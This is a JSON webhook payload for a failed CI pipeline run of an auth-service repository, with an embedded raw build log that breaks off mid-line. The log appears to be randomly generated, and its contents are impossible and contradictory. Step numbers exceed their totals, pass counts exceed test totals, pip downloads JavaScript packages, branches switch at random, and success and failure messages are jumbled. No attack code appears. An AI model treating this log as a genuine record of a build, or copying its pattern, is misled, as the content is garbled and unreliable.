{
  "action": "completed",
  "workflow_run": {
    "id": 153,
    "name": "CI Pipeline",
    "head_branch": "feature/feat-244",
    "head_sha": "cc077a63460ee741b2281e77a643b498a5c4d2c5",
    "status": "completed",
    "conclusion": "failure",
    "run_started_at": "2025-12-04T12:46:10.153788Z",
    "updated_at": "2025-12-04T12:49:08.899692Z"
  },
  "repository": {
    "full_name": "startup-io/auth-service",
    "name": "auth-service"
  },
  "sender": {
    "login": "alice"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: setup_node ===\nWaiting...\n[12:46:10] WARN: Deprecated API usage\nCache restored successfully (381MB)\nWaiting...\nLoading...\n\u2713 Task completed in 4386ms\nStep 9/21: Linting\nProcessing...\nSuccess!\n  PASS: unit/test_api_health.spec.js\nnpm install: resolved 1749 packages\n[12:46:10] DEBUG: Loading configuration\n[12:46:10] INFO: Processing request\nProcessing...\nyarn add: Done in 12.32s\n[12:46:10] INFO: Starting build process\nCompiling src/utils.go...\nUsing Python 3.10\n\u2713 Task completed in 4303ms\nDone.\nCompiling utils/utils.go...\nFetching from https://githubusercontent.com/package.json\n\u26a0 DEPRECATION: Feature will be removed in v3.0\npip: Installing build dependencies...\n[12:46:10] INFO: Processing request\nStep 13/15: Linting\nGET /health - 200 (83ms)\nFetching submodules...\nyarn add: Done in 28.3s\nnpm install: added 75 packages\npip install: Successfully installed webpack-2.20\nNODE_ENV=production\npip: Downloading axios-4.6.tar.gz\nCache hit for key-3045\n[12:46:10] INFO: Processing request\nStep 19/20: Testing\nGenerating source maps...\nBundling styles.css\nArtifact uploaded: dist.zip (96MB)\n[12:46:10] INFO: Processing request\nWARNING: react has known vulnerabilities\nStep 17/15: Testing\nCompiling lib/main.py...\nWARNING: webpack has known vulnerabilities\nnpm install: added 333 packages\nTLS handshake completed\nUsing Node.js 16.4.10\n[12:46:10] INFO: Request completed\n[12:46:10] INFO: Request completed\n[12:46:10] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (23MB)\nGenerating source maps...\nTest Suites: 29 passed, 48 total\n[12:46:10] DEBUG: Connection pool: 20 active\n\u2717 build failed with exit code 52\nCompiling components/service.java...\n[12:46:10] DEBUG: Connection pool: 15 active\npip: Downloading lodash-5.18.tar.gz\nGET /health - 201 (64ms)\n[12:46:10] INFO: Cache refreshed\nLoading...\n[12:46:10] INFO: Cache refreshed\nBundling main.js\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nTransforming 764 files...\nPulling image: node:3.11\npip: Collecting eslint\nVerifying...\n[12:46:10] DEBUG: Loading configuration\n  PASS: integration/test_auth_login.spec.js\n[12:46:10] INFO: Processing request\nnpm notice: package.json updated\nCompiling utils/utils.go...\nFAILED: test_api_health\nCache restored successfully (478MB)\nChecking out master branch\nStep 5/16: Deploying\npip: Downloading react-5.11.tar.gz\nGET /api - 204 (9ms)\npip: Downloading express-3.3.tar.gz\nFetching from https://amazonaws.com/package.json\nMinifying app.js\nChecking out main branch\nStep 20/21: Building\nCompiling src/service.java...\nSwitched to branch 'hotfix/task-614'\nUsing Python 3.12\nHEAD is now at e0a5813\nWARNING: jest has known vulnerabilities\n[12:46:10] INFO: Request completed\nTLS handshake completed\nPOST /upload - 200 (357ms)\n[12:46:10] DEBUG: Loading configuration\npip: Collecting express\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nReady.\n  PASS: test_auth_login (102ms)\nWARNING: webpack has known vulnerabilities\n  PASS: test_cache_hit (426ms)\n[12:46:10] DEBUG: Connection pool: 14 active\nUsing Node.js 14.15.6\npip: Installing build dependencies...\nCompiling components/app.ts...\nConnection established\nUploading artifact 'build' (21 files)\nFetching from https://googleapis.com/package.json\n[12:46:10] WARN: Deprecated API usage\n  PASS: test_auth_login (430ms)\nnpm notice: package.json updated\nSnapshots: 39 passed, 4 total\nWaiting...\nyarn add: Done in 3.77s\nUsing Python 3.11\nCache miss for key-7202\nPOST /data - 202 (279ms)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nGET /health - 204 (49ms)\nCache invalidated: build\nLayer 1/9: ENV command\nStep 17/19: Testing\nCoverage: 96% statements, 72% branches\n[12:46:10] WARN: Deprecated API usage\n[12:46:10] INFO: Request completed\npip: Installing build dependencies...\nSnapshots: 0 passed, 13 total\n[12:46:10] WARN: Deprecated API usage\nCache hit for key-6622\nNODE_ENV=production\nStep 9/18: Linting\nArtifact downloaded: 44MB\nFetching from https://googleapis.com/package.json\nWARNING: lodash has known vulnerabilities\nCache saved successfully\nDone.\n  PASS: integration/test_user_create.spec.js\nCache invalidated: build\nEnvironment: production\nFAILED: test_cache_hit\nArtifact uploaded: dist.zip (87MB)\nWARNING: express has known vulnerabilities\n[12:46:10] INFO: Cache refreshed\n[12:46:10] ERROR: Connection failed\nnpm notice: package.json updated\nBundling vendor.js\nTime: 77.643s\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:46:10] INFO: Processing request\npip: Downloading eslint-1.14.tar.gz\nCompiling src/utils.go...\nRan 127 tests in 37s\nnpm install: resolved 497 packages\nWARNING: webpack has known vulnerabilities\nCompiling components/service.java...\npip: Downloading lodash-1.7.tar.gz\nFAILED: test_cache_hit\n[12:46:10] DEBUG: Query executed in 2ms\n[12:46:10] ERROR: Connection failed\n[12:46:10] DEBUG: Initializing service\n\u2713 All checks passed\nTest Suites: 35 passed, 25 total\nStep 9/19: Building\nTransforming 931 files...\nTLS handshake completed\n[12:46:10] DEBUG: Connection pool: 4 active\nCreating production build...\nCompiling lib/service.java...\nArtifact uploaded: build.tar.gz (23MB)\n[12:46:10] DEBUG: Query executed in 60ms\nBundling runtime.js\nOptimizing 47 modules...\nPlatform: darwin-arm64\nCompleted.\n[12:46:10] WARN: Deprecated API usage\n\u2713 Step 'checkout' succeeded\n[12:46:10] ERROR: Connection failed\n\u2713 All checks passed\n  PASS: integration/test_cache_hit.spec.js\npip: Installing build dependencies...\nArtifact uploaded: build.tar.gz (1MB)\nCreating production build...\nCache invalidated: node_modules\nAlready up to date.\npip: Downloading express-3.15.tar.gz\nOptimizing 25 modules...\nUsing Node.js 17.5.7\nInstalling axios@4.19.7\nOK\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nArtifact uploaded: dist.zip (79MB)\n[12:46:10] DEBUG: Connection pool: 15 active\nTime: 76.149s\nSwitched to branch 'bugfix/task-974'\npip: Installing build dependencies...\nGET /health - 201 (96ms)\nTLS handshake completed\nCompiling lib/handler.rs...\n[12:46:10] INFO: Request completed\n[12:46:10] INFO: Connecting to database\nWARNING: lodash has known vulnerabilities\n[12:46:10] DEBUG: Query executed in 82ms\nCache miss for key-2521\nWaiting...\npip: Installing build dependencies...\n\u2713 lint completed\n=== Step setup_node completed ===\n=== Step: checkout ===\nTransforming 180 files...\nyarn add: Done in 3.98s\nyarn add: Done in 9.99s\nPushing to registry...\n\u2713 Task completed in 4271ms\nCache saved successfully\n[12:46:10] DEBUG: Query executed in 43ms\npip: Installing build dependencies...\nCache saved successfully\nOK\n[12:46:10] DEBUG: Query executed in 92ms\nTransforming 343 files...\nyarn add: Done in 20.60s\nnpm install: added 171 packages\nAlready up to date.\nOptimizing 24 modules...\nWARNING: prettier has known vulnerabilities\nnpm install: resolved 1457 packages\nStep 17/19: Deploying\nLayer 6/15: RUN command\nRan 26 tests in 17s\nyarn add: Done in 14.69s\nStep 2/20: Testing\nSwitched to branch 'bugfix/task-661'\nGenerating source maps...\nReady.\n[12:46:10] DEBUG: Loading configuration\n[12:46:10] INFO: Starting build process\n  PASS: unit/test_user_create.spec.js\nArtifact uploaded: dist.zip (11MB)\npip: Collecting eslint\nMinifying main.js\n\u2713 Task completed in 1216ms\nWARNING: prettier has known vulnerabilities\nCompiling utils/index.js...\n[12:46:10] DEBUG: Loading configuration\nTransforming 889 files...\nUsing Node.js 20.10.3\nArtifact uploaded: dist.zip (58MB)\nPushing to registry...\nEnvironment: production\nWARNING: react has known vulnerabilities\n\u2713 All checks passed\nRan 145 tests in 5s\nBuilding Docker image...\nFinished.\nArtifact downloaded: 43MB\nStep 5/18: Testing\nOK\nArtifact uploaded: dist.zip (7MB)\nLayer 7/10: COPY command\nWARNING: prettier has known vulnerabilities\n  PASS: test_cache_hit (171ms)\nSnapshots: 20 passed, 50 total\nCache restored successfully (433MB)\nStep 9/23: Running migrations\nWaiting...\nReady.\nGET /status - 201 (79ms)\nPulling image: alpine:3.11\nStep 6/22: Building\nTLS handshake completed\nStep 1/17: Running migrations\nnpm install: resolved 1473 packages\nUsing Python 3.12\nSwitched to branch 'bugfix/task-522'\nFetching from https://googleapis.com/package.json\nMinifying app.js\nStep 11/21: Linting\n\u26a0 DEPRECATION: Feature will be removed in v2.0\npip: Downloading eslint-1.7.tar.gz\nArtifact uploaded: dist.zip (17MB)\nStep 9/20: Building\nStep 8/23: Running migrations\n[12:46:10] DEBUG: Loading configuration\n[12:46:10] INFO: Starting build process\nCompiling components/utils.go...\nInstalling prettier@5.19.8\npip: Installing build dependencies...\nMinifying vendor.js\nTest Suites: 49 passed, 5 total\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nnpm install: added 391 packages\n[12:46:10] INFO: Request completed\n\u2713 Step 'checkout' succeeded\nSnapshots: 13 passed, 19 total\npip: Downloading lodash-4.20.tar.gz\nnpm notice: created a lockfile\nStep 8/20: Running migrations\nStep 5/19: Testing\nFAILED: test_auth_login\nConnection established\nWaiting...\nSnapshots: 46 passed, 9 total\nCache invalidated: dependencies\nStep 7/24: Building\nCompiling lib/main.py...\n[12:46:10] DEBUG: Initializing service\nCoverage: 79% statements, 74% branches\nStep 15/22: Linting\nPushing to registry...\n[12:46:10] INFO: Cache refreshed\nCompleted.\nnpm install: added 235 packages\nCache hit for key-8521\n[12:46:10] ERROR: Connection failed\nUsing Node.js 17.15.8\nStep 17/25: Deploying\nLayer 8/9: COPY command\n[12:46:10] ERROR: Connection failed\nnpm install: resolved 1681 packages\nTime: 59.500s\nNODE_ENV=test\nTime: 75.725s\nCache saved successfully\n[12:46:10] DEBUG: Query executed in 60ms\nCompiling components/index.js...\nCompiling src/app.ts...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\npip: Downloading react-5.11.tar.gz\n  PASS: unit/test_cache_hit.spec.js\nSnapshots: 34 passed, 14 total\nTLS handshake completed\nStep 4/21: Testing\nHEAD is now at dbabd39\nStep 11/24: Running migrations\npip install: Successfully installed webpack-4.6\nWaiting...\npip install: Successfully installed react-5.4\nnpm notice: created a lockfile\nCompiling utils/utils.go...\nCoverage: 98% statements, 85% branches\nPushing to registry...\nInstalling lodash@3.4.10\nStep 3/21: Installing dependencies\n  PASS: test_api_health (414ms)\nCompiling components/app.ts...\nCache restored successfully (85MB)\nFetching submodules...\nException: ValueError\nnpm notice: created a lockfile\nNODE_ENV=test\n[12:46:10] DEBUG: Query executed in 78ms\nnpm notice: created a lockfile\n\u2713 Task completed in 540ms\npip: Collecting eslint\nCompiling components/handler.rs...\nStep 5/25: Linting\nCache miss for key-6216\nConnection established\nCoverage: 90% statements, 72% branches\nTLS handshake completed\nFAILED: test_auth_login\n[12:46:10] DEBUG: Connection pool: 15 active\nUsing Node.js 14.2.2\n\u2713 Step 'install' succeeded\nCache miss for key-4700\nPulling image: alpine:latest\n[12:46:10] INFO: Cache refreshed\nException: RuntimeError\nHEAD is now at 0f1ebff\nStep 2/17: Linting\nCompiling src/app.ts...\nWaiting...\n\u2713 Task completed in 3007ms\nCache restored successfully (104MB)\nCache saved successfully\nStep 18/15: Running migrations\nChecking out develop branch\n\u2713 Step 'build' succeeded\nPulling image: python:latest\nCompleted.\nTLS handshake completed\n[12:46:10] ERROR: Connection failed\n\u2713 Step 'setup' succeeded\nTime: 116.414s\n[12:46:10] DEBUG: Memory usage: 225MB\n\u2717 build failed with exit code 73\nDone.\nArtifact uploaded: build.tar.gz (20MB)\nException: RuntimeError\nyarn add: Done in 17.15s\nStep 1/22: Building\nTests: 59 passed, 417 total\nMinifying main.js\nFAILED: test_api_health\nEnvironment: development\n[12:46:10] WARN: Deprecated API usage\nnpm install: resolved 1687 packages\nTest Suites: 26 passed, 26 total\n  PASS: test_auth_login (49ms)\npip install: Successfully installed react-4.6\nArtifact uploaded: dist.zip (21MB)\nGenerating source maps...\nAlready up to date.\nCache hit for key-6423\npip: Installing build dependencies...\nStep 4/22: Linting\nnpm install: resolved 1428 packages\n[12:46:10] INFO: Processing request\nOptimizing 38 modules...\nPushing to registry...\nOptimizing 33 modules...\nCompiling lib/main.py...\n=== Step checkout completed ===\n=== Step: e2e_tests ===\n\u2713 All checks passed\n[12:46:10] DEBUG: Loading configuration\nGenerating source maps...\n[12:46:10] ERROR: Connection failed\nBundling vendor.css\nEnvironment: staging\nFetching from https://registry.npmjs.org/package.json\nFetching from https://pypi.org/package.json\nInstalling eslint@3.11.4\n[12:46:10] DEBUG: Initializing service\nFetching submodules...\nFinished.\nSuccess!\npip: Downloading eslint-1.14.tar.gz\n[12:46:10] INFO: Cache refreshed\nHEAD is now at 9f1944c\nFAILED: test_db_connect\nPOST /data - 201 (495ms)\nCreating production build...\nNODE_ENV=development\n[12:46:10] DEBUG: Memory usage: 927MB\nWaiting...\nStep 2/25: Linting\n  PASS: unit/test_cache_hit.spec.js\nChecking out master branch\nVerifying...\nSuccess!\nLoading...\nLoading...\nMinifying app.js\nyarn add: Done in 6.24s\nPOST /api - 201 (307ms)\nTLS handshake completed\nCoverage: 97% statements, 66% branches\n[12:46:10] INFO: Starting build process\npip: Installing build dependencies...\nStep 20/23: Linting\nHEAD is now at 722744b\nCoverage: 73% statements, 90% branches\nWaiting...\nSuccess!\n[12:46:10] DEBUG: Initializing service\nUsing Python 3.12\nUsing Python 3.11\nBundling styles.css\nWaiting...\nCoverage: 96% statements, 69% branches\nGET /health - 204 (72ms)\n[12:46:10] INFO: Starting build process\nPushing to registry...\n[12:46:10] INFO: Cache refreshed\nSuccess!\nFetching submodules...\nStep 18/20: Testing\nSuccess!\nChecking out main branch\nnpm notice: package.json updated\nWaiting...\n  PASS: e2e/test_db_connect.spec.js\nFetching submodules...\nGET /api - 200 (36ms)\nVerifying...\nCompiling lib/app.ts...\nFetching from https://amazonaws.com/package.json\nCache hit for key-3810\nCache miss for key-7369\nNODE_ENV=production\npip install: Successfully installed axios-2.6\n[12:46:10] DEBUG: Loading configuration\npip: Collecting eslint\nArtifact downloaded: 31MB\nArtifact downloaded: 45MB\nLoading...\nCompiling lib/handler.rs...\npip: Installing build dependencies...\nFetching submodules...\nSnapshots: 15 passed, 4 total\nImage pulled successfully\npip: Installing build dependencies...\nOK\n[12:46:10] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nChecking out main branch\nFetching from https://pypi.org/package.json\nyarn add: Done in 15.13s\npip: Installing build dependencies...\nDone.\nTLS handshake completed\nStep 9/15: Running migrations\n[12:46:10] DEBUG: Query executed in 8ms\nFetching submodules...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:46:10] INFO: Cache refreshed\nUploading artifact 'build' (46 files)\nConnection established\npip: Collecting lodash\nAlready up to date.\nCoverage: 85% statements, 81% branches\nCoverage: 86% statements, 82% branches\nTime: 49.298s\nPushing to registry...\nDone.\nnpm notice: created a lockfile\nWARNING: lodash has known vulnerabilities\n  PASS: unit/test_user_create.spec.js\n[12:46:10] INFO: Starting build process\nFetching submodules...\n[12:46:10] INFO: Cache refreshed\n[12:46:10] WARN: Deprecated API usage\n[12:46:10] INFO: Request completed\nLayer 8/13: ENV command\nCompiling components/index.js...\nWaiting...\nRan 142 tests in 44s\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 18/19: Linting\nArtifact uploaded: dist.zip (9MB)\n[12:46:10] INFO: Starting build process\n[12:46:10] ERROR: Connection failed\nGET /status - 201 (84ms)\nCompiling utils/main.py...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nLoading...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nnpm install: resolved 1223 packages\nStep 6/18: Running migrations\nStep 12/25: Testing\nTests: 115 passed, 123 total\nImage pulled successfully\nStep 1/15: Linting\nyarn add: Done in 20.72s\nCompiling src/service.java...\nProcessing...\nGET /status - 200 (40ms)\nFetching submodules...\nException: TypeError\nMinifying vendor.js\nGET /api - 201 (75ms)\nnpm install: added 461 packages\nCoverage: 98% statements, 85% branches\nTransforming 257 files...\nCompiling lib/handler.rs...\nTests: 300 passed, 460 total\nGET /api - 201 (77ms)\n[12:46:10] INFO: Processing request\nStep 16/24: Building\nTest Suites: 35 passed, 27 total\npip: Installing build dependencies...\nLoading...\n[12:46:10] INFO: Processing request\nStep 3/20: Testing\n\u2713 Step 'setup' succeeded\nnpm notice: created a lockfile\n  PASS: test_db_connect (200ms)\nVerifying...\nCompiling utils/app.ts...\nCompiling utils/handler.rs...\nCache restored successfully (353MB)\nUsing Python 3.9\nPOST /data - 200 (177ms)\nVerifying...\nImage pulled successfully\nBuilding Docker image...\nFAILED: test_auth_login\nUsing Python 3.12\npip install: Successfully installed axios-5.18\nImage pulled successfully\nChecking out main branch\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompiling src/service.java...\nnpm install: resolved 1806 packages\nNODE_ENV=development\n[12:46:10] INFO: Cache refreshed\n\u2713 Step 'checkout' succeeded\nTime: 68.557s\nCompiling utils/main.py...\nRan 77 tests in 46s\nStep 3/21: Installing dependencies\nTLS handshake completed\nPushing to registry...\nConnection established\nStep 15/20: Running migrations\nCoverage: 78% statements, 60% branches\nUploading artifact 'dist' (15 files)\n  PASS: test_api_health (167ms)\nArtifact uploaded: build.tar.gz (30MB)\nGenerating source maps...\nWARNING: react has known vulnerabilities\nEnvironment: staging\nnpm install: added 300 packages\npip: Installing build dependencies...\n[12:46:10] DEBUG: Memory usage: 1345MB\nStep 16/24: Installing dependencies\nRan 199 tests in 37s\nCache hit for key-1461\nVerifying...\n[12:46:10] DEBUG: Memory usage: 1503MB\nCache hit for key-6773\n[12:46:10] INFO: Connecting to database\nArtifact uploaded: dist.zip (21MB)\nWaiting...\nPushing to registry...\n[12:46:10] INFO: Processing request\nnpm notice: package.json updated\n=== Step e2e_tests completed ===\n=== Step: save_cache ===\nCompiling utils/app.ts...\nSuccess!\nPulling image: alpine:latest\n[12:46:10] ERROR: Connection failed\nCache invalidated: node_modules\nCache miss for key-3656\nTLS handshake completed\nTests: 416 passed, 441 total\nUploading artifact 'build' (38 files)\nUsing Node.js 14.17.6\nEnvironment: development\n[12:46:10] INFO: Connecting to database\nCreating production build...\nImage pulled successfully\n[12:46:10] WARN: Deprecated API usage\nBundling vendor.js\nUsing Node.js 15.13.3\nStep 12/23: Installing dependencies\nInstalling jest@3.10.7\nTest Suites: 10 passed, 37 total\nCache hit for key-2176\nCache hit for key-8531\nStep 15/20: Installing dependencies\n\u2713 lint completed\n\u2713 Step 'install' succeeded\n[12:46:10] WARN: Deprecated API usage\n[12:46:10] INFO: Connecting to database\n[12:46:10] WARN: Deprecated API usage\nBundling main.css\n[12:46:10] DEBUG: Query executed in 37ms\n[12:46:10] WARN: Deprecated API usage\nSuccess!\nBuilding Docker image...\n[12:46:10] DEBUG: Connection pool: 15 active\nTLS handshake completed\n[12:46:10] DEBUG: Query executed in 48ms\nGET /api - 204 (42ms)\nTest Suites: 35 passed, 25 total\nProcessing...\nImage pulled successfully\nReady.\nStep 19/21: Installing dependencies\nFetching submodules...\nWARNING: prettier has known vulnerabilities\nCreating production build...\nCompiling src/main.py...\nInstalling eslint@3.1.0\nProcessing...\n[12:46:10] INFO: Cache refreshed\nTests: 240 passed, 447 total\n[12:46:10] WARN: Deprecated API usage\n[12:46:10] INFO: Request completed\nFetching from https://githubusercontent.com/package.json\nRan 181 tests in 39s\nLayer 10/9: RUN command\nStep 13/23: Building\nArtifact uploaded: build.tar.gz (16MB)\n[12:46:10] INFO: Starting build process\nLayer 2/12: ENV command\nTLS handshake completed\n\u2713 lint completed\nCache saved successfully\nCompleted.\nCache miss for key-2808\nOK\nStep 7/25: Linting\nReady.\nSnapshots: 25 passed, 19 total\nStep 17/21: Deploying\npip: Collecting webpack\nInstalling lodash@2.5.3\nCompiling components/utils.go...\nBuilding Docker image...\n[12:46:10] INFO: Starting build process\n[12:46:10] INFO: Request completed\nImage pulled successfully\n[12:46:10] WARN: Deprecated API usage\n[12:46:10] INFO: Starting build process\n[12:46:10] DEBUG: Memory usage: 188MB\nGenerating source maps...\nnpm notice: created a lockfile\nSwitched to branch 'feature/task-248'\nnpm install: resolved 803 packages\n[12:46:10] ERROR: Connection failed\n\u2713 All checks passed\nFinished.\n[12:46:10] DEBUG: Memory usage: 1778MB\nNODE_ENV=production\n[12:46:10] INFO: Processing request\n[12:46:10] INFO: Cache refreshed\npip: Installing build dependencies...\n\u2713 Step 'checkout' succeeded\nHEAD is now at d87f605\nArtifact uploaded: dist.zip (24MB)\nStep 9/16: Deploying\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCache hit for key-8127\n\u2717 build failed with exit code 14\n[12:46:10] DEBUG: Initializing service\n[12:46:10] WARN: Deprecated API usage\n\u2717 build failed with exit code 55\npip: Installing build dependencies...\nStep 19/25: Deploying\nGenerating source maps...\n[12:46:10] INFO: Cache refreshed\nArtifact downloaded: 50MB\nArtifact uploaded: dist.zip (4MB)\n[12:46:10] DEBUG: Connection pool: 9 active\nStep 8/17: Building\nReady.\nGET /health - 204 (2ms)\nTest Suites: 35 passed, 11 total\nUsing Node.js 20.10.4\nArtifact downloaded: 26MB\nWaiting...\n  PASS: test_cache_hit (183ms)\nCache invalidated: build\nnpm install: added 12 packages\nTime: 32.921s\nConnection established\nBuilding Docker image...\nOK\nyarn add: Done in 5.63s\n\u2717 build failed with exit code 90\n[12:46:10] WARN: Deprecated API usage\nLoading...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nTransforming 806 files...\nPOST /upload - 200 (434ms)\nWaiting...\nArtifact uploaded: build.tar.gz (27MB)\nGenerating source maps...\nCache restored successfully (29MB)\nCache miss for key-3317\nOptimizing 85 modules...\nCache hit for key-8708\nUsing Node.js 18.18.4\nnpm notice: package.json updated\nBuilding Docker image...\n[12:46:10] WARN: Deprecated API usage\nnpm notice: created a lockfile\nUsing Node.js 20.4.7\nFinished.\nArtifact uploaded: dist.zip (34MB)\nSuccess!\nException: NullPointerException\nProcessing...\nDone.\nPlatform: darwin-arm64\npip: Installing build dependencies...\nTransforming 722 files...\nTLS handshake completed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCompiling components/utils.go...\n\u2717 build failed with exit code 44\nProcessing...\nDone.\nArtifact uploaded: build.tar.gz (32MB)\nProcessing...\n[12:46:10] INFO: Connecting to database\nUsing Python 3.12\nLoading...\nPlatform: darwin-arm64\nLoading...\n\u2717 build failed with exit code 35\n  PASS: unit/test_user_create.spec.js\nLoading...\nArtifact uploaded: dist.zip (19MB)\nArtifact uploaded: dist.zip (52MB)\nNODE_ENV=test\nAlready up to date.\nHEAD is now at 2cbc4dd\nArtifact uploaded: build.tar.gz (24MB)\nReady.\n[12:46:10] ERROR: Connection failed\nOK\n\u2713 package completed\nWARNING: eslint has known vulnerabilities\nPlatform: linux-x64\nUploading artifact 'dist' (1 files)\nOK\nPushing to registry...\nArtifact uploaded: dist.zip (8MB)\nCache hit for key-2383\nOptimizing 35 modules...\nSuccess!\nVerifying...\nLoading...\nTLS handshake completed\nWARNING: webpack has known vulnerabilities\nSnapshots: 46 passed, 49 total\nOK\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nProcessing...\nnpm install: added 393 packages\nCompiling utils/service.java...\n\u2713 Step 'setup' succeeded\nPOST /upload - 201 (330ms)\nStep 15/25: Installing dependencies\nArtifact downloaded: 1MB\nStep 7/25: Running migrations\nCache hit for key-8529\n[12:46:10] DEBUG: Query executed in 91ms\n=== Step save_cache completed ===\n=== Step: build ===\nTime: 52.109s\nHEAD is now at 87f58e1\nStep 2/22: Building\nException: NullPointerException\nProcessing...\nProcessing...\nCreating production build...\n\u2713 validate completed\nWARNING: jest has known vulnerabilities\nStep 5/25: Deploying\nCoverage: 88% statements, 85% branches\nnpm notice: package.json updated\nRan 68 tests in 30s\nStep 14/21: Deploying\nArtifact uploaded: build.tar.gz (13MB)\nSnapshots: 42 passed, 44 total\nBundling main.css\nHEAD is now at aec7ff6\nGenerating source maps...\nLoading...\nChecking out develop branch\nGET /api - 200 (68ms)\n[12:46:10] DEBUG: Connection pool: 10 active\nBundling styles.js\nProcessing...\n[12:46:10] INFO: Cache refreshed\nUploading artifact 'build' (39 files)\nCache restored successfully (317MB)\nnpm install: added 399 packages\nNODE_ENV=test\nCompiling utils/app.ts...\nStep 11/25: Running migrations\nSuccess!\nInstalling react@3.20.1\nTest Suites: 35 passed, 9 total\n[12:46:10] DEBUG: Initializing service\nWARNING: prettier has known vulnerabilities\nPOST /upload - 201 (362ms)\nNODE_ENV=development\nStep 9/18: Running migrations\nCache hit for key-4599\nCache invalidated: node_modules\n[12:46:10] INFO: Starting build process\n[12:46:10] WARN: Deprecated API usage\nCache hit for key-2259\nCompiling lib/index.js...\nStep 6/22: Running migrations\nBundling main.css\nStep 6/19: Deploying\nnpm notice: package.json updated\n[12:46:10] INFO: Processing request\nUsing Node.js 16.7.7\nCache restored successfully (24MB)\nCompleted.\nGET /health - 201 (5ms)\nPOST /upload - 202 (180ms)\nLoading...\nFetching submodules...\n[12:46:10] DEBUG: Query executed in 51ms\n  PASS: e2e/test_user_create.spec.js\nTransforming 810 files...\nCache restored successfully (370MB)\nnpm notice: package.json updated\n[12:46:10] WARN: Deprecated API usage\nCoverage: 97% statements, 92% branches\nCache hit for key-7563\nArtifact uploaded: build.tar.gz (5MB)\nProcessing...\nPushing to registry...\nCompiling utils/handler.rs...\nHEAD is now at 918df3e\nArtifact uploaded: dist.zip (41MB)\nWARNING: webpack has known vulnerabilities\nWARNING: react has known vulnerabilities\nOK\nCache hit for key-5129\n[12:46:10] WARN: Deprecated API usage\nnpm notice: created a lockfile\nCreating production build...\npip: Installing build dependencies...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nHEAD is now at 64b8374\nUploading artifact 'build' (31 files)\n[12:46:10] INFO: Connecting to database\nGET /api - 204 (65ms)\nCreating production build...\nArtifact uploaded: dist.zip (90MB)\nUsing Node.js 16.19.9\n[12:46:10] DEBUG: Loading configuration\n[12:46:10] WARN: Deprecated API usage\nLoading...\nCache invalidated: dependencies\nPulling image: python:latest\nCache invalidated: build\nVerifying...\nnpm install: added 292 packages\nChecking out main branch\nStep 16/20: Running migrations\npip: Collecting lodash\nTransforming 412 files...\nTransforming 951 files...\n[12:46:10] ERROR: Connection failed\npip: Downloading react-4.18.tar.gz\nnpm install: added 51 packages\nnpm install: resolved 1951 packages\nPOST /api - 200 (296ms)\nSnapshots: 30 passed, 8 total\nAlready up to date.\n[12:46:10] WARN: Deprecated API usage\nSnapshots: 3 passed, 34 total\nUploading artifact 'build' (25 files)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nWARNING: jest has known vulnerabilities\nStep 4/17: Testing\nnpm notice: package.json updated\nCache restored successfully (403MB)\nFetching from https://amazonaws.com/package.json\nEnvironment: development\nCompleted.\nImage pulled successfully\nArtifact downloaded: 19MB\nBuilding Docker image...\nStep 15/15: Running migrations\n  PASS: test_cache_hit (441ms)\nTests: 52 passed, 150 total\n[12:46:10] DEBUG: Query executed in 94ms\n\u2713 package completed\nCompiling src/index.js...\nArtifact downloaded: 6MB\nArtifact uploaded: dist.zip (24MB)\nCompiling lib/index.js...\nArtifact uploaded: dist.zip (33MB)\nnpm install: resolved 1383 packages\n[12:46:10] WARN: Deprecated API usage\nCache saved successfully\nInstalling webpack@2.11.6\nSuccess!\nArtifact downloaded: 50MB\nArtifact uploaded: dist.zip (17MB)\nEnvironment: test\n\u2717 build failed with exit code 12\nStep 9/25: Testing\nCache invalidated: build\n[12:46:10] DEBUG: Query executed in 68ms\npip: Installing build dependencies...\n\u2713 lint completed\nAlready up to date.\nArtifact downloaded: 23MB\nnpm install: resolved 1509 packages\n  PASS: unit/test_db_connect.spec.js\nCache hit for key-3790\nCache invalidated: build\nCompleted.\n[12:46:10] INFO: Request completed\nArtifact uploaded: dist.zip (73MB)\n[12:46:10] INFO: Processing request\n[12:46:10] INFO: Cache refreshed\n[12:46:10] INFO: Cache refreshed\nLoading...\nHEAD is now at 39cb664\n[12:46:10] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u2713 Task completed in 3847ms\nEnvironment: test\nGenerating source maps...\n[12:46:10] DEBUG: Connection pool: 17 active\n\u2713 All checks passed\nPOST /upload - 201 (270ms)\nTests: 80 passed, 415 total\nnpm install: resolved 350 packages\nCache hit for key-1706\nArtifact uploaded: dist.zip (67MB)\nGenerating source maps...\nCompiling lib/main.py...\nProcessing...\nLayer 10/13: ENV command\npip install: Successfully installed webpack-1.6\nProcessing...\nStep 10/20: Installing dependencies\n  PASS: e2e/test_api_health.spec.js\nStep 10/18: Running migrations\nSwitched to branch 'hotfix/task-519'\nStep 16/18: Building\nUsing Python 3.10\nChecking out master branch\nPulling image: python:18\nCompiling src/index.js...\nRan 195 tests in 18s\nnpm install: added 135 packages\nOptimizing 20 modules...\n\u2713 Task completed in 4650ms\nAlready up to date.\nCache invalidated: build\nStep 2/22: Building\nUsing Python 3.10\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nFetching from https://gcr.io/package.json\nMinifying app.js\nDone.\nOK\nCache restored successfully (123MB)\n[12:46:10] INFO: Starting build process\n  PASS: test_user_create (29ms)\npip install: Successfully installed webpack-4.15\n=== Step build completed ===\n=== Step: integration_tests ===\n[12:46:10] DEBUG: Initializing 